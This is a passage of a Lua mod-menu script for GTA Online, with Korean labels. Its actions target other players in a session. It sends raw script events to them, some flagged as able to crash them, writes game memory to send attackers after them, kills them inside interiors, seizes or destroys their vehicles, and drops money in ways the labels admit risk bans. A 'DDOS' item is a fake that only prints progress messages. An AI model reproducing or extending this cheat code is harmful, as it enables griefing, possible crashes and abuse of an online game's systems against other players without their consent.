        util.trigger_script_event(1 << player_id, {879177392, player_id, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(player_id), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.yield(1000)
    end)

    menu.action(trolling, ("용병 보내기"), {}, "", function()
        if NETWORK.NETWORK_IS_SESSION_STARTED() and NETWORK.NETWORK_IS_PLAYER_ACTIVE(player_id) and
        not PED.IS_PED_INJURED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)) and not ryze.is_player_in_interior(player_id) then
    
            if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 1, true, 0) then
                local bits_addr = memory.script_global(1853910 + (players.user() * 862 + 1) + 140)
                memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 1))
                write_global.int(1853348 + (players.user() * 862 + 1) + 141, player_id)
            else
                util.toast("용병들은 이미 그를 쫓고 있다")
            end
        end
    end) 

    menu.action(trolling, "보트로 배송", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh "..players.get_name(player_id))
        menu.trigger_commands("summon "..players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos)
    end)

    menu.action(trolling, "옥내에서 죽이다", {}, "효과가있다 :b", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
    
        for i, interior in ipairs(interior_stuff) do
            if ryze.get_interior_of_player(player_id) == interior then
                util.toast("플레이어가 안에 없습니다. D:")
            return end
            if ryze.get_interior_of_player(player_id) ~= interior then
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
            end
        end
    end)

    local function GiveWeapon(attacker)
        if (weapon0 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(unarmed, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, unarmed, 1, false, true)
        elseif (weapon1 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(machete, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, machete, 1, false, true)
        elseif (weapon2 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(pistol, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, pistol, 1, false, true)
        elseif (weapon3 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(stungun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, stungun, 1, false, true)
        elseif (weapon4 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(atomizer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atomizer, 1, false, true)
        elseif (weapon5 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(shotgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, shotgun, 1, false, true)
        elseif (weapon6 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(sniper, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, sniper, 1, false, true)
        elseif (weapon7 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(microsmg, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, microsmg, 1, false, true)
        elseif (weapon8 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(minigun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, minigun, 1, false, true)
        elseif (weapon9 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(RPG, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, RPG, 1, false, true)
        elseif (weapon10 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(hellbringer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, hellbringer, 1, false, true)
        elseif (weapon11 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(railgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, railgun, 1, false, true)
        end
    end

    local function setAttribute(attacker)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 38, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 0, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 12, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 22, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 54, true)
        PED.SET_PED_COMBAT_RANGE(attacker, 4)
        PED.SET_PED_COMBAT_ABILITY(attacker, 3)
    end

    local pclpid = {}

    menu.action(trolling, "클론", {}, "플레이어 복제.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        aclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0) --spawn clone
        PED.CLONE_PED_TO_TARGET(p, aclone)
        GiveWeapon(aclone)
        setAttribute(aclone)
        TASK.TASK_COMBAT_PED(aclone, p, 0, 16)
        if (isImmortal == true) then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(aclone, false)
        end
    end)

    --menu.action(trolling, "Chop 'Test'", {}, "Saca un chop", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    local c = ENTITY.GET_ENTITY_COORDS(p)
    --    STREAMING.REQUEST_MODEL(chop)
    --    while not STREAMING.HAS_MODEL_LOADED(chop) do
    --        STREAMING.REQUEST_MODEL(chop)
    --        util.yield()
    --    end
    --    local achop = entities.create_ped(26, chop, c, 0) --spawn chop
    --    TASK.TASK_COMBAT_PED(achop , p, 0, 16)
    --    setAttribute(achop)
    --    if (isImmortal == true) then
    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(achop , false)
    --    end
    --    if not STREAMING.HAS_MODEL_LOADED(chop) then
    --        util.toast("No se puede cargar el modelo")
    --    end
    --end)

    menu.action(trolling, "백룸으로 텔레포트 'Test'", {}, "뒷방으로 텔레포트합니다.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defx = c.x
        local defy = c.y 
        local defz = c.z
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                util.yield()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                util.yield()
            end
            RequestControl(veh)
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)

            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)

            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            util.yield(500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            util.yield(500)
            entities.delete_by_handle(veh)
        else
            util.toast(players.get_name(player_id).. " 차량이 아닌")
        end
    end)

    control_veh_cmd = menu.toggle(trolling, "플레이어의 차량 제어", {}, "지상 차량에서만 작동합니다.", function(toggle)
        control_veh = toggle

        while control_veh do 
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
            local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
            if not players.exists(player_id) then util.stop_thread() end

            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("멀리 떨어진 선수.")
                menu.set_value(control_veh_cmd, false)
            return end

            if class == 15 then
                util.toast("El 플레이어는 헬리콥터를 타고 있습니다.")
                menu.set_value(control_veh_cmd, false)
            break end
            
            if class == 16 then
                util.toast("El 플레이어는 비행기에 타고 있습니다.")
                menu.set_value(control_veh_cmd, false)
            return end

            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                if PAD.IS_CONTROL_PRESSED(0, 34) then
                    while not PAD.IS_CONTROL_RELEASED(0, 34) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                    while not PAD.IS_CONTROL_RELEASED(0, 35) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                    while not PAD.IS_CONTROL_RELEASED(0, 32) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                    while not PAD.IS_CONTROL_RELEASED(0, 33) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                        util.yield()
                    end
                end
            else
                util.toast("El 플레이어는 차에 있지 않습니다. :/")
                menu.set_value(control_veh_cmd, false)
            end
            util.yield()
        end
    end)

    menu.action(trolling, "디도스 공격", {}, "DDOS 전송 이것에 대한 책임은 본인에게 있습니다.", function()
        util.toast("디도스 공격 " ..players.get_name(player_id))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("뭘 기대했는데?")
    end)

    menu.action(friendly, "화소 디스플레이", {}, "그들은 하나의 방법만으로 무한 충전 화면을 고칠 수 있었습니다.", function()
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        menu.trigger_commands("aptme" .. players.get_name(player_id))
    end)

    menu.action(friendly, "데스 레벨", {}, "그것은 gta의 수준을 높일 것입니다. \n크래쉬 가능성이 있습니다.", function()
        util.trigger_script_event(1 << player_id, {697566862, player_id, 5, 0, 1, 1, 1})
        for i = 0, 9 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 0, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 1, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 10, i, 1, 1, 1})
        end
        for i = 0, 1 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 6, i, 1, 1, 1})
        end
        for i = 0, 19 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 4, i, 1, 1, 1})
        end
        for i = 0, 99 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 9, i, 1, 1, 1})
            util.yield()
        end
    end)

    menu.toggle_loop(friendly, "무적 모드", {}, "무료 모드 메뉴는 감지하지 못합니다.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), true, true, true, true, true, false, false, true)
        end, function() 
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), false, false, false, false, false, false, false, false)
    end)

    menu.toggle_loop(friendly, "트럼프 카드 주기", {"dropchips"}, "3주간의 테스트를 거쳤으며 안전해 보이지만 언제든지 감지될 수 있습니다.", function(toggle)
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
    end)

    menu.toggle(friendly, "머니 드롭", {}, "우리 모두가 알고 있는 말 그대로 머니 드롭입니다. \n귀찮게 굴지 마, 난 밴에 책임 안 질 거야.", function(on_toggle)
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        if on_toggle then
            util.yield(50)
            menu.trigger_commands("ceopay".. players.get_name(player_id))
            menu.trigger_commands("rp".. players.get_name(player_id))
            menu.trigger_commands("cards".. players.get_name(player_id))
        else
            util.yield(50)
            menu.trigger_commands("ceopay".. players.get_name(player_id))
            menu.trigger_commands("rp".. players.get_name(player_id))
            menu.trigger_commands("cards".. players.get_name(player_id))
        end
        --menu.trigger_commands("cash".. players.get_name(player_id) .. " 1")
    end)

    menu.action(friendly, "생명을 불어넣다", {}, "", function()
        menu.trigger_commands("autoheal"..players.get_name(player_id))
    end)

    menu.action(friendly, "범죄 피해를 입히다.", {}, "항상 도전해 보세요.", function()
        local fcartable = {}

        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defz = c.z
        STREAMING.REQUEST_MODEL(expcar)
        while not STREAMING.HAS_MODEL_LOADED(expcar) do
            STREAMING.REQUEST_MODEL(expcar)
            util.yield()
        end
        STREAMING.REQUEST_MODEL(floorbr)
        while not STREAMING.HAS_MODEL_LOADED(floorbr) do
            STREAMING.REQUEST_MODEL(floorbr)
            util.yield()
        end
        local success, floorcoords
        repeat
            success, floorcoords = util.get_ground_z(c.x, c.y)
            util.yield()
        until success
        floorcoords = floorcoords - 100
        c.z = floorcoords
        local floorrigp = entities.create_object(floorbr, c)
        c.z = defz
        c.z = c.z - 95 
        for i = 1, 22 do
            fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) 
        end
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) 
        util.yield(500)
        entities.delete_by_handle(floorrigp)
        util.yield(1000)
        
        for i = 1, #fcartable do
            entities.delete_by_handle(fcartable[i]) 
            fcartable[i] = nil
        end
    end)

    menu.toggle_loop(friendly, "체크포인트를 획득", {}, "챌린지 체크포인트를 획득할 수 있습니다.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        if PED.IS_PED_IN_ANY_VEHICLE(p) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
            RequestControl(veh)
            local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
            local cdblip = HUD.GET_BLIP_COORDS(dblip)
            ENTITY.SET_ENTITY_COORDS(veh, cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
            util.yield(1500)
        else
            util.toast(players.get_name(player_id).. " 차량 안에 있어야 합니다.")
        end
    end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- Vehicle


    menu.action(vehicle, "차량 수리", {}, "그들의 차량을 수리한다.", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
            util.toast(players.get_name(player_id) .. " 수리된 차량")
        else
            util.toast(" 차량을 제어할 수 없거나 플레이어가 차량에 있지 않습니다.")
        end
    end)

    local desv = menu.list(vehicle, "차량을 비활성화합니다.", {}, "")

    menu.action(desv, "차량 비활성화", {}, "스탠드보다 좋네요", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    menu.action(vehicle, "차량을 비활성화합니다. V2", {}, "스탠드로 잠금 해제 가능 '10/02'", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
            util.toast(players.get_name(player_id) .. " 엔진 고장")
        else
            util.toast(" 차량을 제어할 수 없거나 플레이어가 차량에 있지 않습니다.")
        end
    end)

    menu.toggle_loop(vehicle, "차량을 비활성화합니다. 반복", {}, "스탠드보다 작도이 잘됩니다.", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    local modv = menu.list(vehicle, "차량 개조", {}, "")

    menu.action(modv, "랜덤 업그레이드", {}, "램덤으로 업그레이드 됩니다", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false) 
        local pos = players.get_position(players.user())
        menu.trigger_commands("tp"..players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("godmode on")
        util.yield(6000)
        if ENTITY.DOES_ENTITY_EXIST(veh) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            local getm = VEHICLE.GET_NUM_VEHICLE_MODS(veh)
            for i = 0, 70 do
                VEHICLE.SET_VEHICLE_MOD(veh, i, getm, -1, false)

            end
        else
            util.toast("차량 제어에 실패했습니다.")
        end
        util.yield(500)
        menu.trigger_commands("tp"..players.get_name(player_id))
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("godmode on")
        ENTITY.SET_ENTITY_COORDS(player, pos.x, pos.y, pos.z, 1, false)
    end)

    menu.toggle(modv, "랜덤 업그레이드 (반복)", {}, "램점으로 업그레이드 됩니다", function(on)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false) 
        local pos = players.get_position(players.user())
        if on then
            menu.trigger_commands("invisibility on")
            menu.trigger_commands("godmode on")
            util.yield(200)
            menu.trigger_commands("tp"..players.get_name(player_id))
            util.yield(6000)
            if ENTITY.DOES_ENTITY_EXIST(veh) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                local getm = VEHICLE.GET_NUM_VEHICLE_MODS(veh)
                for i = 0, 70 do
                    VEHICLE.SET_VEHICLE_MOD(veh, i, getm, -1, false)
    
                end
            else
                util.toast("차량에 대한 제어권을 얻는 중 오류입니다.")
            end
        else
            menu.trigger_commands("tp"..players.get_name(player_id))
            menu.trigger_commands("invisibility off")
            menu.trigger_commands("godmode on")
            ENTITY.SET_ENTITY_COORDS(player, pos.x, pos.y, pos.z, 1, false)
        end
    end)

    menu.toggle(modv, "음향추력", {}, "차량 경적을 울릴 때 밀어주세요.", function()
        local player = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 1000, 0.0, true, true, true, true)
        end
    end)

    menu.toggle(modv, "점프 사운드", {}, "차량 경적을 울리면 뛰어내릴 거야", function()
        local player = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 0.0, 1000, true, true, true, true)
        end
    end)
